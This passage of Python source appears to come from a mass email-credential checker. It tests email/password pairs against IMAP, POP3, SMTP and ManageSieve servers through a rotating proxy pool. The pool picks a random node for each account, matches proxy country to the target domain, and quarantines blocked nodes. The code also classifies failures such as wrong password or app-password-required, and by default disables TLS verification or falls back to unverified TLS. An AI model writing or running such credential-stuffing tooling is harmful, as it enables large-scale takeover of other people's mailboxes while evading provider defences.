    insecure=None means "read ALLOW_SELF_SIGNED from CFG", so every caller -
    including the Mailbox Reader - honours the checkbox.
    """
    if insecure is None:
        insecure = bool(live_cfg().get("ALLOW_SELF_SIGNED", True))
    if insecure:
        return _tls_context(host, False).wrap_socket(
            _raw_socket(host, port, proxy_str, timeout), server_hostname=host)

    raw = _raw_socket(host, port, proxy_str, timeout)
    try:
        return _tls_context(host, True).wrap_socket(raw, server_hostname=host)
    except ssl.SSLError as e:
        if live_cfg().get("TLS_STRICT", False):
            warnings.warn(f"Verified TLS failed for {host} ({e!r}); "
                          f"TLS_STRICT is ON so NOT falling back")
            raise
        warnings.warn(f"Verified TLS failed for {host} ({e!r}); "
                      f"retrying unverified on a FRESH socket")
        return _tls_context(host, False).wrap_socket(
            _raw_socket(host, port, proxy_str, timeout), server_hostname=host)
# @@END 061 TLS_LAYER

# @@BLOCK 062 PX_TAG deps=052
def px_tag(proxy_str):
    if not proxy_str or proxy_str == "direct":
        g = direct_geo()
        return f"direct | {g['ip']} | {g['region']} | {g['country']} | {g['vpn']}"
    info = parse_proxy(proxy_str)
    if not info:
        return "proxy"
    meta = proxy_meta.get(proxy_str, {})
    q = " [QUARANTINED]" if proxy_is_quarantined(proxy_str) else ""
    who = f"{info.get('user')}@" if info.get("user") else ""
    return f"{who}{info.get('host')}:{info.get('port')} | {meta.get('country') or '?'} | {meta.get('region') or '?'}{q}"
# @@END 062 PX_TAG

# @@BLOCK 063 PROTOCOL_CLIENTS deps=061
class ProxyIMAP4SSL(imaplib.IMAP4_SSL):
    def __init__(self, host, port=993, timeout=None, proxy_str=None, insecure=None):
        self._proxy_str = proxy_str
        self._insecure = insecure
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return tls_connect(self.host, self.port, self._proxy_str,
                           insecure=self._insecure, timeout=timeout)


class ProxyIMAP4(imaplib.IMAP4):
    def __init__(self, host, port=143, timeout=None, proxy_str=None):
        self._proxy_str = proxy_str
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return _raw_socket(self.host, self.port, self._proxy_str, timeout)


class ProxyPOP3SSL(poplib.POP3_SSL):
    def __init__(self, host, port=995, timeout=None, proxy_str=None, insecure=None):
        self._proxy_str = proxy_str
        self._insecure = insecure
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return tls_connect(self.host, self.port, self._proxy_str,
                           insecure=self._insecure, timeout=timeout)


class ProxyPOP3(poplib.POP3):
    def __init__(self, host, port=110, timeout=None, proxy_str=None):
        self._proxy_str = proxy_str
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return _raw_socket(self.host, self.port, self._proxy_str, timeout)


def pop3_ok(resp):
    if resp is None:
        return False
    if isinstance(resp, (bytes, bytearray)):
        return bytes(resp).lstrip().startswith(b"+")
    if isinstance(resp, str):
        return resp.lstrip().startswith("+")
    if isinstance(resp, (tuple, list)):
        return len(resp) >= 1
    return True
# @@END 063 PROTOCOL_CLIENTS

# @@BLOCK 064 IMAP_SASL deps=063
def _imap_caps(mail) -> set:
    """UPPERCASE capability tokens as a set of str.  Never raises.  Cached."""
    cached = getattr(mail, "_venice_caps", None)
    if cached is not None:
        return cached
    out = set()
    try:
        raw = getattr(mail, "capabilities", None)
        if raw is None:
            raw = ()
        if isinstance(raw, (str, bytes, bytearray)):
            raw = (raw,)
        for c in raw:
            if c is None:
                continue
            if isinstance(c, bytes):
                out.update(c.decode("ascii", "ignore").upper().split())
            elif isinstance(c, bytearray):
                out.update(bytes(c).decode("ascii", "ignore").upper().split())
            else:
                out.update(str(c).upper().split())
        if not out:
            try:
                typ, dat = mail.capability()
                if typ == "OK":
                    for c in (dat or []):
                        if c is None:
                            continue
                        if isinstance(c, (bytes, bytearray)):
                            out.update(bytes(c).decode("ascii", "ignore").upper().split())
                        else:
                            out.update(str(c).upper().split())
            except Exception:
                pass
    except Exception:
        out = set()
    try:
        mail._venice_caps = out
    except Exception:
        pass
    return out


def _imap_wants_plain(mail) -> bool:
    """True when the server will not accept the LOGIN command."""
    caps = _imap_caps(mail)
    if not caps:
        return False
    if "LOGINDISABLED" in caps:
        return True
    if "AUTH=PLAIN" in caps and "AUTH=LOGIN" not in caps:
        return True
    return False


def _imap_authenticate_plain(mail, user, password):
    """SASL PLAIN via AUTHENTICATE.  imaplib base64-encodes whatever we return,
    so the payload must be RAW."""
    raw = ("\0" + user + "\0" + password).encode("utf-8")
    mail.authenticate("PLAIN", lambda _challenge: raw)


def _imap_auth(mail, user, password):
    """LOGIN, or AUTHENTICATE PLAIN when the server disables LOGIN."""
    user = (user or "").strip()
    password = (password or "").strip()

    if _imap_wants_plain(mail):
        try:
            _imap_authenticate_plain(mail, user, password)
            return
        except imaplib.IMAP4.abort:
            raise
        except imaplib.IMAP4.error as e:
            msg = str(e).lower()
            if any(k in msg for k in ("authenticationfailed", "invalid credentials",
                                      "authentication failed", "login failed",
                                      "auth failed", "bad credentials")):
                raise
            try:
                mail.state = "NONAUTH"
            except Exception:
                pass

    typ, data = mail.login(user, password)
    if typ != "OK":
        raise RuntimeError(f"IMAP login returned non-OK status: {typ} {data}")
# @@END 064 IMAP_SASL

# @@BLOCK 065 SMTP_AUTH deps=023,061
_HELO_STATE = STATE["helo_name"]


def smtp_helo_name() -> str:
    now = time.time()
    if _HELO_STATE.get("name") and now - _HELO_STATE.get("ts", 0.0) < 3600:
        return _HELO_STATE["name"]
    with STATE["helo_lock"]:
        if _HELO_STATE.get("name") and time.time() - _HELO_STATE.get("ts", 0.0) < 3600:
            return _HELO_STATE["name"]
        name = ""
        try:
            name = socket.getfqdn() or ""
        except Exception:
            name = ""
        if "." not in name:
            ip = public_ip()
            if ip and ip != "Unknown":
                name = f"[{ip}]"
        if not name:
            name = "localhost"
        _HELO_STATE.update(name=name, ts=time.time())
        return name


def _smtp_read_reply(sock, limit=24) -> str:
    lines = []
    for _ in range(limit):
        buf = b""
        while not buf.endswith(b"\n"):
            try:
                chunk = sock.recv(1)
            except Exception:
                chunk = b""
            if not chunk:
                break
            buf += chunk
        if not buf:
            break
        text = buf.decode("utf-8", errors="ignore").rstrip("\r\n")
        lines.append(text)
        if len(text) >= 4 and text[3] == "-":
            continue
        break
    return "\n".join(lines)


def _smtp_cmd(sock, cmd, quiet=False) -> str:
    try:
        sock.sendall((cmd + "\r\n").encode())
    except Exception:
        if not quiet:
            raise
        return ""
    try:
        return _smtp_read_reply(sock)
    except Exception:
        if quiet:
            return ""
        raise


def smtp_auth_once(email, password, server, proxy_str=None, insecure=None, port=587,
                   attempt_timeout=None, user=None):
    """Confirm-only SMTP submission AUTH.  Raises SmtpAuthError ONLY on a clean 535."""
    if insecure is None:
        insecure = bool(live_cfg().get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or live_cfg()["TIMEOUT"]
    s = None
    try:
        s = _raw_socket(server, port, proxy_str, timeout=to)
        if int(port) == 465:
            s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
        s.settimeout(max(READ_FLOOR_MIN, float(to)))

        banner = _smtp_read_reply(s)
        if not banner.startswith("220"):
            raise SmtpSoftError(f"banner not 220: {banner[:60]!r}")

        ehlo = _smtp_cmd(s, f"EHLO {smtp_helo_name()}")
        caps = ehlo.upper()
        if "STARTTLS" in caps and int(port) != 465:
            r = _smtp_cmd(s, "STARTTLS")
            if r.startswith("220"):
                s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
                s.settimeout(max(READ_FLOOR_MIN, float(to)))
                ehlo = _smtp_cmd(s, f"EHLO {smtp_helo_name()}")
                caps = ehlo.upper()
        if "AUTH" not in caps:
            raise SmtpSoftError("server does not advertise AUTH")

        who = (user or email).strip()
        payload = base64.b64encode(f"\0{who}\0{password}".encode()).decode()

        r = _smtp_cmd(s, f"AUTH PLAIN {payload}")
        if r.startswith("334"):
            r = _smtp_cmd(s, payload)

        low = r.lower()
        if r.startswith("504") or "unrecognized" in low or "not supported" in low:
            r2 = _smtp_cmd(s, "AUTH LOGIN")
            if r2.startswith("334"):
                _smtp_cmd(s, base64.b64encode(who.encode()).decode())
                r = _smtp_cmd(s, base64.b64encode(password.encode()).decode())
            else:
                r = r2
            low = r.lower()

        if r.startswith("235"):
            return True
        if (r.startswith("535") or "authentication failed" in low
                or "invalid credentials" in low
                or "username and password not accepted" in low):
            raise SmtpAuthError(f"SMTP AUTH rejected: {r[:90]}")
        raise SmtpSoftError(f"SMTP AUTH inconclusive: {r[:90]}")
    finally:
        if s is not None:
            try:
                _smtp_cmd(s, "QUIT", quiet=True)
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
# @@END 065 SMTP_AUTH

# @@BLOCK 066 SIEVE_AUTH deps=011,023,061
def sieve_auth_once(email, password, server, proxy_str=None, insecure=None,
                    port=SIEVE_PORT, attempt_timeout=None, user=None):
    """Confirm-only ManageSieve (RFC 5804) AUTH.  Same credentials, port 4190."""
    if insecure is None:
        insecure = bool(live_cfg().get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or live_cfg()["TIMEOUT"]
    s = None
    try:
        s = _raw_socket(server, port, proxy_str, timeout=to)
        s.settimeout(max(READ_FLOOR_MIN, float(to)))
        greet = s.recv(600).decode("utf-8", errors="ignore")
        if not greet:
            raise SieveSoftError("no ManageSieve greeting")
        up = greet.upper()
        if "SIEVE" not in up and "IMPLEMENTATION" not in up:
            raise SieveSoftError(f"not a ManageSieve greeting: {greet[:60]!r}")
        if "STARTTLS" in up:
            s.sendall(b"STARTTLS\r\n")
            r = s.recv(300).decode("utf-8", errors="ignore")
            if r.startswith("OK"):
                s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
                s.settimeout(max(READ_FLOOR_MIN, float(to)))
                s.recv(600)
        who = (user or email).strip()
        payload = base64.b64encode(f"\0{who}\0{password}".encode()).decode()
        s.sendall(f'AUTHENTICATE "PLAIN" "{payload}"\r\n'.encode())
        r = s.recv(600).decode("utf-8", errors="ignore")
        up = r.upper()
        if up.startswith("OK"):
            return True
        if (up.startswith("NO") or "AUTHENTICATIONFAILED" in up
                or "INVALID" in up or "AUTHENTICATION FAILED" in up):
            raise SieveAuthError(f"ManageSieve AUTH rejected: {r[:90]}")
        raise SieveSoftError(f"ManageSieve inconclusive: {r[:90]}")
    finally:
        if s is not None:
            try:
                s.sendall(b"LOGOUT\r\n")
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
# @@END 066 SIEVE_AUTH

# @@BLOCK 067 ERROR_CLASSIFY deps=016,017,022,023,039
# status.py emits the SPECIFIC tokens (WRONG_PASSWORD, NEED_APP_PASSWORD,
# RBL_BLOCKED, RETRY_LATER) while every ladder in this file compares the
# COLLAPSED names (WRONG, APP, RBL, RETRY).  note_verdict()'s whitelist holds
# only the collapsed names, so an AUTHENTICATIONFAILED was filed as Connection
# Failed and silently dropped.  Fold once, at the boundary.
# DNS_FAILED / SMTP_FAILED are already SPECIFIC, are reported as their own
# buckets (dns_results / smtp_results) and arm the Fast-Mode cooldown, so they
# map to THEMSELVES - flattening them onto CONNECTION_FAILED made a DNS problem
# indistinguishable from a refused socket.
_CANON_STATUS = {
    WRONG_PASSWORD: WRONG,
    NEED_APP_PASSWORD: APP,
    RBL_BLOCKED: RBL,
    RETRY_LATER: RETRY,
    FAILED: CONNECTION_FAILED,
    DNS_FAILED: DNS_FAILED,
    SMTP_FAILED: SMTP_FAILED,
}


def classify_error(err, domain=""):
    try:
        err_str = str(err)
        if domain in ZERO_ACCESS_PROVIDERS:
            return APP
        st_val = st_classify(err_str, domain)
        return _CANON_STATUS.get(st_val, st_val)
    except Exception:
        return UNKNOWN


def _is_proxy_level_error(msg):
    """True when the failure is a PROXY CREDENTIAL rejection - not a tunnel reset.

    FIX PX-1: status.is_proxy_level_error() runs normalise() on its argument, so
    it only answers for a TOKEN ("PROXY_UNHEALTHY"). Every caller here passes RAW
    error TEXT, for which normalise() yields UNKNOWN - the answer was therefore
    always False and a 407 arriving as a generic exception never set saw_407,
    never recorded an is_proxy_auth strike and never armed the quarantine. The
    inline fallback in block 004 does substring matching and was right all along.
    This now does the same thing first, and only falls back to the token test.
    """
    s = (msg or "").lower()
    if not s:
        return False
    if _is_proxy_auth_fail(s):
        return True
    if "proxy auth" in s or "proxyconnect" in s:
        return True
    try:
        return st_proxy_level(s) is True
    except Exception:
        return False


def record_proxy_attempt(proxy_str, success, is_network_error=False, is_proxy_auth=False):
    try:
        if not proxy_str:
            return
        if is_proxy_auth and live_cfg().get("QUARANTINE_407", True):
            _park_proxy_407(proxy_str)
            if not proxy_is_quarantined(proxy_str):
                with proxy_quarantine_lock:
                    _proxy_407[proxy_str] += 1
                    strikes = _proxy_407[proxy_str]
                if strikes >= PROXY_407_QUARANTINE:
                    quarantine_proxy(proxy_str, f"{strikes}x 407")
        threshold = int(live_cfg().get("BLACKLIST_CF", BLACKLIST_CF_DEFAULT))
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "Unknown",
                                         "region": "Unknown", "latency_ms": 0}
            m = proxy_meta[proxy_str]
            if success:
                m["success"] = m.get("success", 0) + 1
                consecutive_proxy_failures[proxy_str] = 0
            else:
                m["fails"] = m.get("fails", 0) + 1
                if is_network_error:
                    consecutive_proxy_failures[proxy_str] += 1
                    if consecutive_proxy_failures[proxy_str] >= threshold:
                        circuit_breaker_until[proxy_str] = time.time() + CIRCUIT_BREAKER_SECONDS
                        consecutive_proxy_failures[proxy_str] = 0
            m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
    except Exception as e:
        warnings.warn(f"Error recording proxy attempt: {e}")
# @@END 067 ERROR_CLASSIFY

# @@BLOCK 068 SMTP_PRECHECK deps=043,059,061,065
def _smtp_banner_ok(hosts, px, timeout=3.5):
    for h in hosts:
        for port, use_tls in ((587, False), (465, True), (25, False)):
            s = None
            try:
                s = _raw_socket(h, port, px, timeout=timeout)
                if use_tls:
                    s = _tls_context(h, False).wrap_socket(s, server_hostname=h)
                s.settimeout(timeout)
                banner = s.recv(200)
                if banner[:3] == b"220":
                    return True
            except Exception:
                pass
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
    return False


def smtp_domain_probe(domain, timeout=3.5):
    try:
        hosts = host_smtp_candidates(domain) or []
    except Exception:
        hosts = []
    if not hosts:
        return None

    live = [h for h in hosts[:2] if fast_fail_dns_check(h)]
    if not live:
        return False

    if _smtp_banner_ok(live, None, timeout):
        return True

    with alive_pool_lock:
        have_pool = bool(alive_pool)
    if have_pool and live_cfg().get("PROXY_MODE", "fallback") != "off":
        if _smtp_banner_ok(live, sample_alive_proxy(domain=domain), timeout):
            return True
    return False


def smtp_cached(domain):
    with _SMTP_LOCK:
        hit = _SMTP_DOMAIN_CACHE.get(domain)
    return bool(hit and (time.time() - hit[0]) < _SMTP_CACHE_TTL)


def smtp_precheck_domains(domains, max_workers=None, budget=None):
    max_workers = max_workers or _SMTP_PRECHECK_WORKERS
    budget = budget or _SMTP_PRECHECK_BUDGET

    results = {}
    doms = [d for d in dict.fromkeys(d for d in (domains or []) if d)]
    if not doms:
        return results

    now = time.time()
    todo = []
    with _SMTP_LOCK:
        for d in doms:
            hit = _SMTP_DOMAIN_CACHE.get(d)
            if hit and (now - hit[0]) < _SMTP_CACHE_TTL:
                results[d] = hit[1]
            else:
                todo.append(d)

    if not todo:
        return results

    deadline = time.time() + budget
    try:
        with ThreadPoolExecutor(max_workers=min(max_workers, len(todo))) as ex:
            futs = {ex.submit(smtp_domain_probe, d): d for d in todo}
            for fut in as_completed(futs, timeout=max(1.0, deadline - time.time())):
                d = futs[fut]
                try:
                    res = fut.result()
                except Exception:
                    res = None
                results[d] = res
                with _SMTP_LOCK:
                    _SMTP_DOMAIN_CACHE[d] = (time.time(), res)
    except Exception as e:
        log_startup(f"WARNING: SMTP pre-check batch timeout/error: {e}", quiet=True)

    for d in todo:
        results.setdefault(d, None)
    return results


def smtp_failed_check(domain, px, trace_logs):
    try:
        hosts = host_smtp_candidates(domain)
    except Exception:
        hosts = []
    if not hosts:
        trace_logs.append("SMTP failed check: no SMTP candidate hosts discovered")
        return None
    attempted = 0
    for h in hosts[:2]:
        if not fast_fail_dns_check(h):
            trace_logs.append(f"SMTP failed check: {h} does not resolve locally")
            continue
        for port, use_tls in ((587, False), (465, True), (25, False)):
            attempted += 1
            s = None
            try:
                s = _raw_socket(h, port, px, timeout=min(6.0, max(3.0, float(
                    live_cfg().get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))))
                if use_tls:
                    s = _tls_context(h, False).wrap_socket(s, server_hostname=h)
                s.settimeout(min(6.0, max(3.0, float(live_cfg().get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))))
                banner = s.recv(200)
                if banner[:3] == b"220":
                    trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port} OK")
                    return True
                trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port}: "
                                  f"unexpected banner {banner[:40]!r}")
            except Exception as e:
                trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port}: {str(e)[:90]}")
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
    if attempted:
        trace_logs.append("SMTP failed check -> all SMTP candidates failed")
        return False
    trace_logs.append("SMTP failed check -> no reachable SMTP candidate")
    return None


def _smtp_hosts_for(domain, cap=SMTP_HOST_CAP):
    """First SMTP submission host, preferring an explicit smtp.<domain>."""
    try:
        hosts = [h for h in (host_smtp_candidates(domain) or []) if h]
    except Exception:
        hosts = []
    if not hosts:
        return []
    if not hosts[0].lower().startswith("smtp"):
        for i, h in enumerate(hosts):
            if h.lower().startswith("smtp"):
                hosts.insert(0, hosts.pop(i))
                break
    return hosts[:cap]
# @@END 068 SMTP_PRECHECK

# @@BLOCK 069 POOL_SAMPLE deps=052
def sample_alive_proxy(exclude=None, domain=None, avoid=None):
    """RANDOM ROTATION with an account-level avoid set."""
    exclude = set(exclude or ())
    avoid = set(avoid or ())
    with alive_pool_lock:
        pool = [p for p in alive_pool if p]
    if not pool:
        return None

    if live_cfg().get("QUARANTINE_407", True):
        with proxy_quarantine_lock:
            q = set(proxy_quarantine)
        fresh = [p for p in pool if p not in q]
        if not fresh and q:
            with alive_pool_lock:
                whole = set(alive_pool)
            if whole and q >= whole:
                with proxy_quarantine_lock:
                    proxy_quarantine.clear()
                _proxy_407.clear()
                try:
                    STATE.setdefault("proxy_407_until", {}).clear()
                except Exception:
                    pass
                log_startup("Quarantine lifted: every pool node had 407'd - retrying them all.",
                            quiet=True)
                log_probe_event("quarantine auto-lifted (whole pool was quarantined)")
            fresh = pool
        if fresh:
            pool = fresh

    if live_cfg().get("GEO_CALL", False) and domain:
        want = tld_country(domain)
        if want:
            matched = [p for p in pool
                       if str(proxy_meta.get(p, {}).get("country", "")).lower() == want.lower()]
            if matched:
                pool = matched

    if live_cfg().get("QUARANTINE_407", True):
        unparked = [p for p in pool if not _proxy_407_parked(p)]
        if unparked:
            pool = unparked

    cand = [p for p in pool if p not in exclude and p not in avoid]
    if not cand:
        cand = [p for p in pool if p not in exclude]
    if not cand:
        cand = pool

    if not live_cfg().get("RANDOM_ROTATION", True):
        with STATE["rr_lock"]:
            STATE["rr_index"] = (STATE["rr_index"] + 1) % len(pool)
            return pool[STATE["rr_index"]]

    with STATE["rr_lock"]:
        last = STATE.get("rr_last")
        if len(cand) > 1 and last in cand:
            cand = [p for p in cand if p != last]
        pick = random.choice(cand)
        STATE["rr_last"] = pick
        return pick
# @@END 069 POOL_SAMPLE

# @@BLOCK 070 TUNNEL_PROBE deps=023,052,053
def tunnel_probe(proxy_str, targets=None, timeout=None):
    """Open a REAL CONNECT tunnel through the node and classify the outcome.

    A 407 arriving on ANY scheme is an auth refusal, decided AFTER the loops -
    the node's scheme memory is driven by an actual SUCCESS only.  A FAILURE
    always tries the alternate scheme.
    """
    out = {"ok": False, "reason": "dead", "latency_ms": 0, "target": "",
           "scheme": None, "error": ""}
    if not proxy_str:
        out["ok"] = True
        out["reason"] = "ok"
        return out
    info = parse_proxy(proxy_str)
    if not info:
        out["reason"] = "format"
        out["error"] = "parse_proxy() returned None (unrecognised line shape)"
        return out
    if not SOCKS_OK:
        out["reason"] = "nosocks"
        out["error"] = "PySocks not installed"
        return out

    targets = targets or probe_targets()
    try:
        _max_t = max(1, int(live_cfg().get("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT)))
    except Exception:
        _max_t = PROBE_MAX_TARGETS_DEFAULT
    targets = list(targets)[:_max_t]
    try:
        _second_scheme = bool(live_cfg().get("PROBE_SECOND_SCHEME", PROBE_SECOND_SCHEME_DEFAULT))
    except Exception:
        _second_scheme = PROBE_SECOND_SCHEME_DEFAULT

    budget = float(timeout if timeout is not None else probe_timeout())
    hard_deadline = time.time() + max(1.5, budget)

    errors = []
    auth_schemes = set()
    started_all = time.time()

    for host, port, label in targets:
        if time.time() >= hard_deadline:
            errors.append(f"{label}: skipped (node budget spent)")
            break
        for _s_idx, ptype in enumerate(_scheme_order(proxy_str)):
            if _s_idx and out["ok"] and not _second_scheme:
                break
            left = hard_deadline - time.time()
            if left <= 0.6:
                break
            attempt_to = max(0.8, min(budget, left))
            s = None
            started = time.time()
            try:
                kw = {"proxy_type": ptype, "proxy_addr": info["host"],
                      "proxy_port": info["port"], "proxy_rdns": True}
                if info["user"]:
                    kw["proxy_username"] = info["user"]
                    kw["proxy_password"] = info["pass"]
                s = socks.create_connection((host, port), timeout=attempt_to, **kw)
                _remember_scheme(proxy_str, ptype)
                out.update(ok=True, reason="ok", scheme=ptype, target=label,
                           latency_ms=int((time.time() - started_all) * 1000))
            except Exception as e:
                msg = str(e)
                errors.append(f"{label}/{'HTTP' if ptype == socks.HTTP else 'SOCKS5'}: "
                              f"{type(e).__name__}: {msg[:110]}")
                if _is_proxy_auth_fail(msg):
                    auth_schemes.add(ptype)
                elif isinstance(e, (socket.timeout, TimeoutError)) or "timed out" in msg.lower():
                    if out["reason"] != "auth":
                        out["reason"] = "timeout"
                else:
                    if out["reason"] != "auth":
                        out["reason"] = "transport"
                out["target"] = label
                out["latency_ms"] = int((time.time() - started) * 1000)
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
        if out["ok"] and not _second_scheme:
            return out

    if out["ok"]:
        out["reason"] = "ok"
        out["error"] = " ; ".join(errors)[:300]
        return out

    if auth_schemes:
        out["reason"] = "auth"

    out["error"] = " ; ".join(errors)[:300]
    return out
# @@END 070 TUNNEL_PROBE

# @@BLOCK 071 PRECHECK_FAST deps=025,041,058,070
def precheck_proxy_fast(proxy_str):
    try:
        if not proxy_str:
            return True
        if proxy_is_blocked(proxy_str):
            record_probe_result(proxy_str, False, "blocked", error="circuit breaker active")
            return False
        info = parse_proxy(proxy_str)
        if not info:
            record_probe_result(proxy_str, False, "format",
                                error="unrecognised line shape: " + proxy_str[:60])
            log_probe_event(f"FORMAT {proxy_str[:60]}")
            return False
        if not SOCKS_OK:
            record_probe_result(proxy_str, False, "nosocks", error="PySocks missing")
            return False
        if not is_proxy_alive(info["host"], info["port"],
                              timeout=float(live_cfg().get("PROXY_PRECHECK_TIMEOUT",
                                                           PROXY_PRECHECK_TIMEOUT_DEFAULT))):
            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
            record_probe_result(proxy_str, False, "tcp",
                                error=f"direct TCP to {info['host']}:{info['port']} failed")
            log_probe_event(f"TCPDEAD {info['host']}:{info['port']}")
            return False

        res = _gated_tunnel(proxy_str)
        record_probe_result(proxy_str, res["ok"], res["reason"],
                            latency_ms=res.get("latency_ms", 0),
                            target=res.get("target", ""), scheme=res.get("scheme"),
                            error=res.get("error", ""))

        if res["ok"]:
            record_proxy_attempt(proxy_str, success=True)
            try:
                with proxy_lock:
                    m = proxy_meta.setdefault(
                        proxy_str, {"fails": 0, "success": 0, "country": "Unknown",
                                    "region": "Unknown", "latency_ms": 0})
                    if res.get("latency_ms"):
                        m["latency_ms"] = int(res["latency_ms"])
            except Exception:
                pass
            return True

        if res["reason"] == "auth":
            record_proxy_attempt(proxy_str, success=False, is_network_error=True,
                                 is_proxy_auth=True)
            log_probe_event(f"AUTH407 {info['host']}:{info['port']} -> {res.get('error', '')[:200]}")
        else:
            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
            if res["reason"] in ("timeout", "dead", "transport"):
                log_probe_event(f"{res['reason'].upper()} {info['host']}:{info['port']} "
                                f"-> {res.get('error', '')[:200]}")
        return False
    except Exception:
        return False
# @@END 071 PRECHECK_FAST

# @@BLOCK 072 RUN_BATCH deps=-
def _run_batch(fn, items, workers, budget):
    """Run fn(item) over items with a HARD wall-clock budget."""
    done_ids = set()
    timed_out = False
    if not items:
        return [], False
    ex = ThreadPoolExecutor(max_workers=max(1, min(int(workers), len(items))))
    try:
        f2i = {ex.submit(fn, it): it for it in items}
        try:
            for fut in as_completed(f2i, timeout=budget):
                try:
                    if fut.result():
                        done_ids.add(id(f2i[fut]))
                except Exception:
                    continue
        except Exception:
            timed_out = True
        for fut in f2i:
            if fut.done():
                try:
                    if fut.result():
                        done_ids.add(id(f2i[fut]))
                except Exception:
                    pass
    finally:
        ex.shutdown(wait=False)
    return [it for it in items if id(it) in done_ids], timed_out
# @@END 072 RUN_BATCH

# @@BLOCK 073 MAIL_SPOT_CHECK deps=015,025,070
def _mail_spot_target():
    """The real mail destination to test the pool against."""
    try:
        ov = STATE.get("probe_targets_override") or []
        for h, p, _l in ov:
            if h:
                return (h, int(p))
    except Exception:
        pass
    return MAIL_SPOT_FALLBACK


def mail_dest_spot_check(force: bool = False):
    """CONNECT a few nodes to a MAIL destination and report it."""
    if not force and not live_cfg().get("MAIL_SPOT_CHECK", MAIL_SPOT_CHECK_DEFAULT):
        return
    with alive_pool_lock:
        pool = [p for p in alive_pool if p]
    if not pool:
        STATE["mail_spot"] = {"ts": time.time(), "host": "", "port": 0, "ok": 0,
                              "auth": 0, "other": 0, "n": 0, "error": "empty pool"}
        return
    host, port = _mail_spot_target()
    sample = random.sample(pool, min(MAIL_SPOT_NODES, len(pool)))
    ok = auth = other = 0
    err = ""
    for p in sample:
        try:
            res = _gated_tunnel(p, timeout=MAIL_SPOT_TIMEOUT,
                                targets=[(host, port, "mailspot")])
        except Exception as e:
            other += 1
            err = err or f"{type(e).__name__}: {str(e)[:120]}"
            continue
        if res.get("ok"):
            ok += 1
        elif res.get("reason") == "auth":
            auth += 1
            err = err or (res.get("error", "") or "")
        else:
            other += 1
            err = err or (res.get("error", "") or "")
    STATE["mail_spot"] = {"ts": time.time(), "host": host, "port": int(port), "ok": ok,
                          "auth": auth, "other": other, "n": len(sample),
                          "error": (err or "")[:300]}
    line = (f"mail-dest spot check {host}:{port} -> pass={ok} 407={auth} "
            f"other={other} of {len(sample)} node(s)")
    log_probe_event(line)
    if auth and not ok:
        log_probe_event("*** pool passes the WEB probe but the provider 407s MAIL "
                        "destinations - check the 'email servers' cap ***")
# @@END 073 MAIL_SPOT_CHECK

# @@BLOCK 074 REFRESH_POOL deps=013,014,025,058,069,071,073
def refresh_alive_pool(force: bool = False, budget: float = None):
    budget = float(budget if budget is not None else PROBE_BATCH_BUDGET)

    if (not force) and (not STATE.get("run_active")) \
            and not live_cfg().get("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT):
        return

    if not _PROBE_OWNER_LOCK.acquire(blocking=False):
        if not force:
            return
        _t0 = time.time()
        while _PROBE_OWNER_LOCK.locked() and (time.time() - _t0) < budget:
            time.sleep(0.2)
        if not _PROBE_OWNER_LOCK.acquire(blocking=False):
            return

    if (not force) and STATE.get("run_active"):
        last = STATE.get("last_probe_ts", 0.0)
        if last and (time.time() - last) < PROBER_STALE_WHILE_RUNNING:
            try:
                _PROBE_OWNER_LOCK.release()
            except Exception:
                pass
            return

    STATE["probe_in_flight"] = True
    try:
        try:
            raw = get_filtered_active_proxies(quiet=True)
        except Exception:
            raw = []
        if not raw:
            with alive_pool_lock:
                alive_pool[:] = []
            log_startup("Alive pool refreshed: proxies.txt is empty.", quiet=True)
            return

        try:
            _sample = max(0, int(live_cfg().get("PROBE_SAMPLE_MAX", 0)))
        except Exception:
            _sample = 0
        if _sample and len(raw) > _sample:
            raw = random.sample(raw, _sample)
            log_probe_event(f"probe sample: {_sample} node(s) this cycle")

        try:
            file_keys = set(load_proxies(quiet=True))
        except Exception:
            file_keys = set()
        if file_keys:
            with proxy_lock:
                for k in list(proxy_meta.keys()):
                    if k not in file_keys:
                        proxy_meta.pop(k, None)
            with probe_stats_lock:
                for k in list(probe_stats.keys()):
                    if k not in file_keys:
                        probe_stats.pop(k, None)
            with proxy_quarantine_lock:
                for k in list(proxy_quarantine):
                    if k not in file_keys:
                        proxy_quarantine.discard(k)
                        _proxy_407.pop(k, None)
            with _proxy_scheme_lock:
                for k in list(_proxy_scheme.keys()):
                    if k not in file_keys:
                        _proxy_scheme.pop(k, None)

        if not live_cfg().get("PROXY_TEST_FLIGHT", True):
            with alive_pool_lock:
                alive_pool[:] = raw
            enrich_proxy_geo(raw)
            save_proxy_meta()
            log_startup(f"Test Flight OFF: pool set to all {len(raw)} candidate(s) "
                        f"without probing.", quiet=True)
            try:
                mail_dest_spot_check()
            except Exception as _mse:
                log_probe_event(f"mail-dest spot check failed: {_mse}")
            return

        _tgts = probe_targets()
        log_probe_event(f"refresh start: {len(raw)} candidate(s), target={live_cfg().get('PROBE_TARGET')} "
                        f"({[t[0] for t in _tgts]}), budget={budget:.0f}s, "
                        f"workers={probe_workers()}")

        live, batch_timed_out = _run_batch(precheck_proxy_fast, raw, probe_workers(), budget)

